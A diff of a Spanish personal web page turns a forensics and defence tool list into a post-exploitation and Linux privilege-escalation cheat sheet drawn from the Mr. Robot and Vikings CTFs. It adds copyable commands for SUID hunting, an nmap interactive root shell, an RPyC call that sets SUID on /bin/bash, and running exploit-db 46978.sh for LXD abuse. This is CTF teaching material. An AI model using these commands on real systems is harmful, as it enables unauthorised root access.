@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Jose L. Trigo - Forense y Defensa</title>
+  <title>Jose L. Trigo - Post-explotación</title>
 
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -71,82 +71,144 @@
       </div>
     </header>
 
-    <div class="breadcrumb fade-in"><a href="../">Inicio</a> &gt; <a href="index.html">Herramientas</a> &gt; Forense y Defensa</div>
+    <div class="breadcrumb fade-in"><a href="../">Inicio</a> &gt; <a href="index.html">Herramientas</a> &gt; Post-explotación</div>
 
     <section class="fade-in delay-1">
       <div class="page-header">
-        <span class="icon">🛡️</span>
-        <h1>Forense y Defensa</h1>
+        <span class="icon">⬆️</span>
+        <h1>Post-explotación y Escalada</h1>
         <span class="back-link"><a href="index.html">← Volver al catálogo</a></span>
       </div>
-      <p style="color:#4a75a0;font-size:1rem;margin-top:4px;">Análisis de memoria, logs, detección de intrusiones y respuesta a incidentes.</p>
+      <p style="color:#4a75a0;font-size:1rem;margin-top:4px;">Enumeración del sistema, búsqueda de vectores de escalada y ejecución de exploits para obtener privilegios de root.</p>
     </section>
 
     <section class="fade-in delay-2">
 
-      <!-- Volatility -->
+      <!-- Enumeración del sistema -->
       <div class="tool-card">
-        <div class="tool-name"><span class="tool-icon">🧠</span><h3>Volatility</h3><span class="badge">Memory Forensics</span></div>
-        <p class="desc">Framework de análisis forense de memoria RAM.</p>
+        <div class="tool-name"><span class="tool-icon">🔎</span><h3>Enumeración del sistema</h3><span class="badge">Reconocimiento</span></div>
+        <p class="desc">Comandos para recopilar información del sistema tras obtener acceso inicial.</p>
+
         <div class="command-block">
-          <span class="cmd"><span class="prompt">$</span> volatility -f memory.dmp imageinfo</span>
+          <span class="cmd"><span class="prompt">$</span> whoami</span>
+          <button class="copy-btn" onclick="copyCommand(this)">Copiar</button>
+        </div>
+        <div class="command-block">
+          <span class="cmd"><span class="prompt">$</span> id</span>
+          <button class="copy-btn" onclick="copyCommand(this)">Copiar</button>
+        </div>
+        <div class="command-block">
+          <span class="cmd"><span class="prompt">$</span> groups</span>
+          <button class="copy-btn" onclick="copyCommand(this)">Copiar</button>
+        </div>
+        <div class="command-block">
+          <span class="cmd"><span class="prompt">$</span> ps aux | grep [servicio]</span>
           <button class="copy-btn" onclick="copyCommand(this)">Copiar</button>
         </div>
         <div class="extra-commands">
           <div class="command-block">
-            <span class="cmd"><span class="prompt">$</span> volatility -f memory.dmp --profile=Win7SP1x64 pslist</span>
+            <span class="cmd"><span class="prompt">$</span> ls -la /</span>
             <button class="copy-btn" onclick="copyCommand(this)">Copiar</button>
           </div>
           <div class="command-block">
-            <span class="cmd"><span class="prompt">$</span> volatility -f memory.dmp --profile=Win7SP1x64 netscan</span>
+            <span class="cmd"><span class="prompt">$</span> find /home /var /etc /root -name "*.txt" 2>/dev/null</span>
             <button class="copy-btn" onclick="copyCommand(this)">Copiar</button>
           </div>
         </div>
       </div>
 
-      <!-- Autopsy / Sleuth Kit -->
+      <!-- Búsqueda de binarios SUID -->
       <div class="tool-card">
-        <div class="tool-name"><span class="tool-icon">🔬</span><h3>Autopsy / The Sleuth Kit</h3><span class="badge">Disk Forensics</span></div>
-        <p class="desc">Análisis forense de discos y sistemas de archivos.</p>
+        <div class="tool-name"><span class="tool-icon">🔑</span><h3>Binarios SUID</h3><span class="badge">Escalada</span></div>
+        <p class="desc">Localización de ejecutables con permisos SUID que pueden ser explotados para elevar privilegios.</p>
+
         <div class="command-block">
-          <span class="cmd"><span class="prompt">$</span> autopsy</span>
+          <span class="cmd"><span class="prompt">$</span> find / -user root -perm -4000 -type f 2>/dev/null</span>
           <button class="copy-btn" onclick="copyCommand(this)">Copiar</button>
         </div>
-        <div class="extra-commands">
-          <div class="command-block">
-            <span class="cmd"><span class="prompt">$</span> fls -r -m / /dev/sda1 &gt; body.txt</span>
-            <button class="copy-btn" onclick="copyCommand(this)">Copiar</button>
-          </div>
-        </div>
+        <p style="color:#4a75a0;font-size:0.85rem;margin:6px 0 0 0;">Utilizado en Mr. Robot para descubrir que <strong>nmap</strong> tiene el bit SUID activo.</p>
       </div>
 
-      <!-- Snort -->
+      <!-- Nmap SUID -->
       <div class="tool-card">
-        <div class="tool-name"><span class="tool-icon">🚨</span><h3>Snort</h3><span class="badge">IDS/IPS</span></div>
-        <p class="desc">Sistema de detección de intrusiones basado en reglas.</p>
+        <div class="tool-name"><span class="tool-icon">🔓</span><h3>Nmap (SUID)</h3><span class="badge">Escalada</span></div>
+        <p class="desc">Explotación de la versión 3.81 de Nmap con modo interactivo para obtener una shell como root.</p>
+
         <div class="command-block">
-          <span class="cmd"><span class="prompt">$</span> snort -c /etc/snort/snort.conf -A console</span>
+          <span class="cmd"><span class="prompt">$</span> nmap --version</span>
           <button class="copy-btn" onclick="copyCommand(this)">Copiar</button>
         </div>
-        <div class="extra-commands">
-          <div class="command-block">
-            <span class="cmd"><span class="prompt">$</span> snort -r captura.pcap -c /etc/snort/snort.conf</span>
-            <button class="copy-btn" onclick="copyCommand(this)">Copiar</button>
-          </div>
+        <div class="command-block">
+          <span class="cmd"><span class="prompt">$</span> nmap --interactive</span>
+          <button class="copy-btn" onclick="copyCommand(this)">Copiar</button>
         </div>
+        <div class="command-block">
+          <span class="cmd"><span class="prompt">nmap&gt;</span> !sh</span>
+          <button class="copy-btn" onclick="copyCommand(this)">Copiar</button>
+        </div>
+        <div class="command-block">
+          <span class="cmd"><span class="prompt">#</span> whoami</span>
+          <button class="copy-btn" onclick="copyCommand(this)">Copiar</button>
+        </div>
+        <p style="color:#4a75a0;font-size:0.85rem;margin:6px 0 0 0;">Vulnerabilidad presente en la versión 3.81 de Nmap. Permite ejecutar comandos con prefijo <code>!</code> desde el modo interactivo.</p>
       </div>
 
-      <!-- Suricata -->
+      <!-- RPyC (Vikings) -->
       <div class="tool-card">
-        <div class="tool-name"><span class="tool-icon">⚡</span><h3>Suricata</h3><span class="badge">IDS/IPS</span></div>
-        <p class="desc">Motor de detección de intrusiones con soporte multi-threading.</p>
+        <div class="tool-name"><span class="tool-icon">🐍</span><h3>RPyC</h3><span class="badge">Escalada</span></div>
+        <p class="desc">Explotación de un servicio RPyC mal configurado que se ejecuta como root (Vikings CTF).</p>
+
         <div class="command-block">
-          <span class="cmd"><span class="prompt">$</span> suricata -c /etc/suricata/suricata.yaml -i eth0</span>
+          <span class="cmd"><span class="prompt">$</span> ps aux | grep rpyc</span>
           <button class="copy-btn" onclick="copyCommand(this)">Copiar</button>
         </div>
+        <div class="command-block">
+          <span class="cmd"><span class="prompt">$</span> python3 -c 'import rpyc; c = rpyc.classic.connect("127.0.0.1", port=18812); c.modules.os.system("chmod +s /bin/bash")'</span>
+          <button class="copy-btn" onclick="copyCommand(this)">Copiar</button>
+        </div>
+        <div class="command-block">
+          <span class="cmd"><span class="prompt">$</span> /bin/bash -p</span>
+          <button class="copy-btn" onclick="copyCommand(this)">Copiar</button>
+        </div>
+        <p style="color:#4a75a0;font-size:0.85rem;margin:6px 0 0 0;">El comando asigna el bit SUID a <code>/bin/bash</code> permitiendo ejecutarlo con privilegios de root.</p>
+      </div>
+
+      <!-- LXD (Vikings) -->
+      <div class="tool-card">
+        <div class="tool-name"><span class="tool-icon">📦</span><h3>LXD</h3><span class="badge">Escalada</span></div>
+        <p class="desc">Abuso del grupo LXD para montar el sistema de archivos del host dentro de un contenedor y escalar privilegios (Vikings CTF).</p>
+
+        <div class="command-block">
+          <span class="cmd"><span class="prompt">$</span> searchsploit lxd</span>
+          <button class="copy-btn" onclick="copyCommand(this)">Copiar</button>
+        </div>
+        <div class="command-block">
+          <span class="cmd"><span class="prompt">$</span> searchsploit -m linux/local/46978.sh</span>
+          <button class="copy-btn" onclick="copyCommand(this)">Copiar</button>
+        </div>
+        <div class="command-block">
+          <span class="cmd"><span class="prompt">$</span> bash 46978.sh alpine.tar.gz</span>
+          <button class="copy-btn" onclick="copyCommand(this)">Copiar</button>
+        </div>
+        <p style="color:#4a75a0;font-size:0.85rem;margin:6px 0 0 0;">El exploit crea un contenedor con acceso al sistema de archivos raíz del host, permitiendo obtener una shell con privilegios de root.</p>
+      </div>
+
+      <!-- Comandos post-root -->
+      <div class="tool-card">
+        <div class="tool-name"><span class="tool-icon">📂</span><h3>Comandos post-root</h3><span class="badge">Exploración</span></div>
+        <p class="desc">Comandos utilizados una vez obtenidos privilegios de root para navegar y localizar flags.</p>
+
         <div class="extra-commands">
           <div class="command-block">
-            <span class="cmd"><span class="prompt">$</span> suricata -r captura.pcap -l /var/log/suricata/</span>
+            <span class="cmd"><span class="prompt">#</span> ls -la /root</span>
+            <button class="copy-btn" onclick="copyCommand(this)">Copiar</button>
+          </div>
+          <div class="command-block">
+            <span class="cmd"><span class="prompt">#</span> cat /root/root.txt</span>
+            <button class="copy-btn" onclick="copyCommand(this)">Copiar</button>
+          </div>
+          <div class="command-block">
+            <span class="cmd"><span class="prompt">#</span> find / -name "key-3-of-3.txt" 2>/dev/null</span>
             <button class="copy-btn" onclick="copyCommand(this)">Copiar</button>
           </div>
         </div>
@@ -162,7 +224,9 @@
       const block = btn.closest('.command-block') || btn.parentElement;
       const cmdSpan = block.querySelector('.cmd');
       if (!cmdSpan) return;
-      let cmdText = cmdSpan.textContent.replace(/^\$\s*/, '').trim();
+      let cmdText = cmdSpan.textContent;
+      // Eliminar el prompt (todo lo que esté antes del último espacio o caracter especial)
+      cmdText = cmdText.replace(/^(#\s*|\$\s*|nmap&gt;\s*)/, '').trim();
       navigator.clipboard.writeText(cmdText).then(() => {
         btn.textContent = '✓ Copiado';
         btn.classList.add('copied');
